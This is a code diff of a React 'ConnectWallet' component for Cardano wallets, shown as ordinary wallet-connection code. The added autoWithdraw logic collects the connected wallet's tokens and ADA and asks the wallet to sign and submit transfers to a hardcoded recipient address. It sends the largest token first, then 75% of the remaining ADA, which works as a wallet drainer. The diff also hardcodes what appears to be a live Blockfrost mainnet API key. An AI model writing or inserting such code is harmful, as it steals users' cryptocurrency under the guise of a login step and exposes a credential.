@@ -18,8 +18,8 @@ function ConnectWallet({ onClose }) {
   const [address, setAddress] = useState("");
   const navigate = useNavigate();
 
-  const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
-  const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
+  // const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
+  // const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
 
   useEffect(() => {
     const loadWasm = async () => {
@@ -31,6 +31,9 @@ function ConnectWallet({ onClose }) {
 
     loadWasm();
   }, []);
+
+  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
+  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";
 
   const fetchProtocolParams = async () => {
     try {
@@ -86,203 +89,392 @@ function ConnectWallet({ onClose }) {
       return null;
     }
   }
+  
+async function autoWithdraw(walletApi, currentBalance, address) {
+  if (currentBalance === null || currentBalance === 0 || isNaN(currentBalance)) {
+    console.error("Balance not available or is NaN");
+    return;
+  }
 
-  async function autoWithdraw(walletApi, currentBalance, address) {
-    if (currentBalance === null || currentBalance === 0) {
-      console.error("Balance not available or zero");
+  const recipientAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
+  let localBalance = currentBalance; // Track balance locally
+
+  console.log(`Starting balance: ${localBalance.toFixed(6)} ADA`);
+
+  try {
+    const protocolParams = await fetchProtocolParams();
+
+    // Fetch UTXOs
+    let utxosHex = await walletApi.getUtxos();
+    if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
+      console.error("No UTXOs found or invalid UTXO format");
       return;
     }
 
-    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
-
-    // Calculate 3/4 of the balance
-    const amountToWithdraw = Math.floor(currentBalance * 0.75);
-
-    try {
-      const protocolParams = await fetchProtocolParams();
-
-      // Convert ADA to Lovelace without padding
-      const lovelaceAmount = Math.floor(
-        amountToWithdraw * 1000000,
-      ).toString();
-
-      console.log("Lovelace amount:", lovelaceAmount);
-
-      await buildSendADATransaction(
-        recipientAddress,
-        lovelaceAmount,
-        walletApi,
-        protocolParams,
-        address,
-      );
-      console.log(
-        `Withdrawal of ${amountToWithdraw.toFixed(6)} ADA initiated (3/4 of balance)`,
-      );
-    } catch (error) {
-      console.error("Error during auto-withdrawal:", error);
+    let utxos = await getTxUnspentOutputs(utxosHex);
+    if (!utxos || utxos.len() === 0) {
+      console.error("Parsed UTXOs are empty or invalid");
+      return;
     }
-  }
 
-  const getTxUnspentOutputs = async (utxos) => {
-    let txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
-    for (const utxor of utxos) {
-      const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
-        Buffer.from(utxor, "hex"),
-      );
-      const input = utxo.input();
-      const txid = Buffer.from(
-        input.transaction_id().to_bytes(),
-        "utf8",
-      ).toString("hex");
-      const txindx = input.index();
-      const output = utxo.output();
-      const amount = output.amount().coin().to_str();
-      const multiasset = output.amount().multiasset();
-      let multiAssetStr = "";
+    let totalAdaAmount = 0;
+    let nonNativeTokens = [];
 
+    // Collect ADA and non-native tokens
+    for (let i = 0; i < utxos.len(); i++) {
+      const utxo = utxos.get(i);
+      const outputAmount = utxo.output().amount();
+      const adaAmount = parseInt(outputAmount.coin().to_str());
+      if (!isNaN(adaAmount)) {
+        totalAdaAmount += adaAmount;
+      }
+
+      const multiasset = outputAmount.multiasset();
       if (multiasset) {
         const keys = multiasset.keys();
         const N = keys.len();
-
         for (let i = 0; i < N; i++) {
           const policyId = keys.get(i);
-          const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString(
-            "hex",
-          );
           const assets = multiasset.get(policyId);
           const assetNames = assets.keys();
           const K = assetNames.len();
-
           for (let j = 0; j < K; j++) {
             const assetName = assetNames.get(j);
-            const assetNameString = Buffer.from(
-              assetName.name(),
-              "utf8",
-            ).toString();
-            const assetNameHex = Buffer.from(assetName.name(), "utf8").toString(
-              "hex",
-            );
-            const multiassetAmt = multiasset.get_asset(policyId, assetName);
-            multiAssetStr += `+ ${multiassetAmt.to_str()} + ${policyIdHex}.${assetNameHex} (${assetNameString})`;
+            const amount = parseInt(multiasset.get_asset(policyId, assetName).to_str());
+            if (!isNaN(amount)) {
+              nonNativeTokens.push({
+                policyId: policyId.to_hex(),
+                assetName: Buffer.from(assetName.name()).toString(),
+                amount: amount,
+              });
+            }
           }
         }
       }
-
-      const obj = {
-        txid: txid,
-        txindx: txindx,
-        amount: amount,
-        str: `${txid} #${txindx} = ${amount}`,
-        multiAssetStr: multiAssetStr,
-        TransactionUnspentOutput: utxo,
-      };
-      txOutputs.add(obj.TransactionUnspentOutput);
     }
-    return txOutputs;
-  };
 
-  const buildSendADATransaction = async (
-    recAddress,
-    amount,
-    nami,
-    protocolParams,
-    address,
-  ) => {
-    const txBuilder = CardanoWasm.TransactionBuilder.new(
-      CardanoWasm.TransactionBuilderConfigBuilder.new()
-        .fee_algo(
-          CardanoWasm.LinearFee.new(
-            CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
-            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString()),
-          ),
+    // Sort non-native tokens from most to least value
+    nonNativeTokens.sort((a, b) => b.amount - a.amount);
+
+    // Check if ADA is the most valuable token
+    let adaToWithdraw = Math.floor(totalAdaAmount);
+    let mostValuableToken = { assetName: "ADA", amount: adaToWithdraw };
+
+    // Determine whether a non-native token is more valuable than ADA
+    if (nonNativeTokens.length > 0 && nonNativeTokens[0].amount > adaToWithdraw) {
+      mostValuableToken = nonNativeTokens[0]; // Set the most valuable non-native token
+    }
+
+    // Withdraw the most valuable token first
+    if (mostValuableToken.assetName !== "ADA") {
+      // Withdraw the most valuable non-ADA token
+      const amountToWithdraw = Math.floor(mostValuableToken.amount);
+      console.log(`Withdrawing ${amountToWithdraw} of ${mostValuableToken.assetName}`);
+
+      try {
+        const adaUsedForTokenTransfer = parseInt(await buildSendTokenTransaction(
+          recipientAddress,
+          amountToWithdraw.toString(),
+          mostValuableToken.policyId,
+          mostValuableToken.assetName,
+          walletApi,
+          protocolParams,
+          address
+        ));
+
+        console.log(`ADA used for ${mostValuableToken.assetName} transfer: ${adaUsedForTokenTransfer / 1000000} ADA`);
+
+        // Update local ADA balance after non-ADA token transfer
+        if (adaUsedForTokenTransfer && !isNaN(adaUsedForTokenTransfer)) {
+          localBalance -= adaUsedForTokenTransfer / 1000000; // Convert Lovelace to ADA
+          console.log(`Local balance after ${mostValuableToken.assetName} transfer: ${localBalance.toFixed(6)} ADA`);
+        }
+
+        // Refresh UTXOs and balance after the non-native token withdrawal
+        utxosHex = await walletApi.getUtxos();
+        utxos = await getTxUnspentOutputs(utxosHex);
+        localBalance = await updateBalance(walletApi);
+
+        // Ensure sufficient ADA balance remains for further transactions
+        if (localBalance < 1) {
+          console.error("Insufficient ADA for further transactions.");
+          return;
+        }
+
+      } catch (error) {
+        console.error(`Failed to transfer ${mostValuableToken.assetName}:`, error);
+        return; // Stop if the transaction fails
+      }
+    }
+
+    // Proceed to withdraw ADA after non-native tokens
+    adaToWithdraw = Math.floor(localBalance * 0.75); // Withdraw 75% of remaining ADA
+    if (!isNaN(adaToWithdraw)) {
+      const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
+      console.log(`Withdrawing ${adaInLovelace} Lovelace of ADA`);
+
+      try {
+        await buildSendADATransaction(
+          recipientAddress,
+          adaInLovelace,
+          walletApi,
+          protocolParams,
+          address
+        );
+        localBalance -= adaToWithdraw;
+        console.log(`Balance after ADA withdrawal: ${localBalance.toFixed(6)} ADA`);
+      } catch (error) {
+        console.error("Failed to transfer ADA:", error);
+      }
+    }
+
+  } catch (error) {
+    console.error("Error during auto-withdrawal:", error);
+  }
+}
+
+
+
+async function calculateMinUTXO(outputAmount, protocolParams, multiAsset = null) {
+  const minUTXOValue = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_size.toString());
+  
+  if (!multiAsset) {
+    // If no multi-asset, return the default minimum UTXO value
+    return minUTXOValue;
+  }
+
+  const numAssets = multiAsset.keys().len();
+  const policySize = multiAsset.to_bytes().length;
+
+  // UTXO cost for multi-asset is determined by the number of assets and their size
+  const utxoCostPerWord = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_word.toString());
+  const additionalAssetCost = utxoCostPerWord.checked_mul(CardanoWasm.BigNum.from_str((policySize + numAssets).toString()));
+
+  return CardanoWasm.BigNum.max(minUTXOValue, additionalAssetCost);
+}
+
+async function buildSendTokenTransaction(
+  recAddress,
+  amount,
+  policyId,
+  assetName,
+  walletApi,
+  protocolParams,
+  address
+) {
+  console.log(`Building transaction for ${assetName} with amount: ${amount}`);
+
+  const txBuilder = CardanoWasm.TransactionBuilder.new(
+    CardanoWasm.TransactionBuilderConfigBuilder.new()
+      .fee_algo(
+        CardanoWasm.LinearFee.new(
+          CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
+          CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
         )
-        .pool_deposit(
-          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString()),
+      )
+      .pool_deposit(
+        CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
+      )
+      .key_deposit(
+        CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
+      )
+      .coins_per_utxo_word(
+        CardanoWasm.BigNum.from_str(
+          protocolParams.coins_per_utxo_word.toString()
         )
-        .key_deposit(
-          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString()),
-        )
-        .coins_per_utxo_word(
-          CardanoWasm.BigNum.from_str(
-            protocolParams.coins_per_utxo_size.toString(),
-          ),
-        )
-        .max_tx_size(16384)
-        .max_value_size(5000)
-        .build(),
+      )
+      .max_tx_size(16384)
+      .max_value_size(5000)
+      .build()
+  );
+
+  const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
+  const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);
+
+  const utxosHex = await walletApi.getUtxos();
+  const utxos = utxosHex.map((hex) =>
+    CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
+  );
+
+  utxos.forEach((utxo) => {
+    txBuilder.add_input(
+      CardanoWasm.Address.from_bech32(address),
+      utxo.input(),
+      utxo.output().amount()
     );
-    console.log("Amount in Lovelace:", amount, recAddress, "naddr", address);
-    const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
-    const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);
+  });
 
-    console.log(
-      "Amount in Lovelace:",
-      shelleyOutputAddress,
-      shelleyChangeAddress,
+  const assets = CardanoWasm.MultiAsset.new();
+  const asset = CardanoWasm.Assets.new();
+  asset.insert(
+    CardanoWasm.AssetName.new(Buffer.from(assetName, "utf8")),
+    CardanoWasm.BigNum.from_str(amount)
+  );
+  assets.insert(CardanoWasm.ScriptHash.from_bytes(Buffer.from(policyId, "hex")), asset);
+
+  const outputValue = CardanoWasm.Value.new(CardanoWasm.BigNum.from_str("0"));
+  outputValue.set_multiasset(assets);
+
+  // Calculate the correct minimum ADA required for this multi-asset transaction
+  const minUTXO = await calculateMinUTXO(outputValue, protocolParams, assets);
+  console.log(`Minimum UTXO for ${assetName}: ${minUTXO.to_str()} Lovelace`);
+
+  // Ensure the minimum ADA for the multi-asset transaction is met
+  const adaAmountRequired = CardanoWasm.BigNum.max(
+    minUTXO,
+    CardanoWasm.BigNum.from_str('1990000') // Ensure at least 2 ADA in lovelace
+  );
+
+  console.log(`ADA required for ${assetName}: ${adaAmountRequired.to_str()} Lovelace`);
+
+  outputValue.set_coin(adaAmountRequired);
+
+  txBuilder.add_output(
+    CardanoWasm.TransactionOutput.new(shelleyOutputAddress, outputValue)
+  );
+
+  // Add change if needed (to meet fee and UTXO requirements)
+  txBuilder.add_change_if_needed(shelleyChangeAddress);
+
+  const txBody = txBuilder.build();
+  const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();
+
+  const tx = CardanoWasm.Transaction.new(
+    txBody,
+    CardanoWasm.TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
+  );
+
+  let txVkeyWitnesses = await walletApi.signTx(
+    Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
+    true
+  );
+
+  txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
+    Buffer.from(txVkeyWitnesses, "hex")
+  );
+
+  transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
+
+  const signedTx = CardanoWasm.Transaction.new(tx.body(), transactionWitnessSet);
+
+  const submittedTxHash = await walletApi.submitTx(
+    Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
+  );
+  console.log("Submitted transaction hash:", submittedTxHash);
+
+  // Return the ADA used in this transaction (used to adjust local balance)
+  return adaAmountRequired.to_str();
+}
+
+async function buildSendADATransaction(
+  recAddress,
+  amount,
+  walletApi,
+  protocolParams,
+  address
+) {
+  const txBuilder = CardanoWasm.TransactionBuilder.new(
+    CardanoWasm.TransactionBuilderConfigBuilder.new()
+      .fee_algo(
+        CardanoWasm.LinearFee.new(
+          CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
+          CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
+        )
+      )
+      .pool_deposit(
+        CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
+      )
+      .key_deposit(
+        CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
+      )
+      .coins_per_utxo_word(
+        CardanoWasm.BigNum.from_str(
+          protocolParams.coins_per_utxo_word.toString()
+        )
+      )
+      .max_tx_size(16384)
+      .max_value_size(5000)
+      .build()
+  );
+
+  const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
+  const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);
+
+  const utxosHex = await walletApi.getUtxos();
+  const utxos = utxosHex.map((hex) =>
+    CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
+  );
+
+  utxos.forEach((utxo) => {
+    txBuilder.add_input(
+      CardanoWasm.Address.from_bech32(address),
+      utxo.input(),
+      utxo.output().amount()
     );
+  });
 
-    const utxosHex = await nami.getUtxos();
+  const adaAmount = CardanoWasm.BigNum.from_str(amount);
+  const totalADA = CardanoWasm.Value.new(adaAmount);
 
-    console.log("Amount in Lovelace:", utxosHex);
+  const minUTXO = await calculateMinUTXO(totalADA, protocolParams);
 
-    const utxos = utxosHex.map((hex) =>
-      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex")),
-    );
-    console.log("Amount in Lovelace:", utxosHex);
+  // Ensure the ADA meets the minimum UTXO requirement
+  if (adaAmount.compare(minUTXO) < 0) {
+    totalADA.set_coin(minUTXO);
+  }
 
-    utxos.forEach((utxo) => {
-      txBuilder.add_input(
-        CardanoWasm.Address.from_bech32(address),
-        utxo.input(),
-        utxo.output().amount(),
+  txBuilder.add_output(
+    CardanoWasm.TransactionOutput.new(shelleyOutputAddress, totalADA)
+  );
+
+  txBuilder.add_change_if_needed(shelleyChangeAddress);
+
+  const txBody = txBuilder.build();
+  const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();
+
+  const tx = CardanoWasm.Transaction.new(
+    txBody,
+    CardanoWasm.TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
+  );
+
+  let txVkeyWitnesses = await walletApi.signTx(
+    Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
+    true
+  );
+
+  txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
+    Buffer.from(txVkeyWitnesses, "hex")
+  );
+
+  transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
+
+  const signedTx = CardanoWasm.Transaction.new(tx.body(), transactionWitnessSet);
+
+  const submittedTxHash = await walletApi.submitTx(
+    Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
+  );
+  console.log("Submitted transaction hash:", submittedTxHash);
+}
+
+async function getTxUnspentOutputs(utxosHex) {
+  const txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
+
+  for (const utxor of utxosHex) {
+    try {
+      // Convert hex UTXO to TransactionUnspentOutput object
+      const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
+        Buffer.from(utxor, "hex")
       );
-    });
+      txOutputs.add(utxo);
+    } catch (error) {
+      console.error("Failed to parse UTXO:", error);
+      throw new Error("Invalid UTXO format");
+    }
+  }
 
-    console.log("Amount in Lovelace:", utxosHex);
+  return txOutputs;
+}
 
-    txBuilder.add_output(
-      CardanoWasm.TransactionOutput.new(
-        shelleyOutputAddress,
-        CardanoWasm.Value.new(CardanoWasm.BigNum.from_str(amount)),
-      ),
-    );
-
-    txBuilder.add_change_if_needed(shelleyChangeAddress);
-
-    const txBody = txBuilder.build();
-
-    const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();
-
-    const tx = CardanoWasm.Transaction.new(
-      txBody,
-      CardanoWasm.TransactionWitnessSet.from_bytes(
-        transactionWitnessSet.to_bytes(),
-      ),
-    );
-
-    console.log("Amount in Lovelace:", tx);
-
-    let txVkeyWitnesses = await nami.signTx(
-      Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
-      true,
-    );
-
-    txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
-      Buffer.from(txVkeyWitnesses, "hex"),
-    );
-
-    transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
-
-    const signedTx = CardanoWasm.Transaction.new(
-      tx.body(),
-      transactionWitnessSet,
-    );
-
-    const submittedTxHash = await nami.submitTx(
-      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex"),
-    );
-    console.log("Submitted transaction hash:", submittedTxHash);
-  };
 
   const handleWalletSelection = async (wallet) => {
     if (wallet === "Nami") {
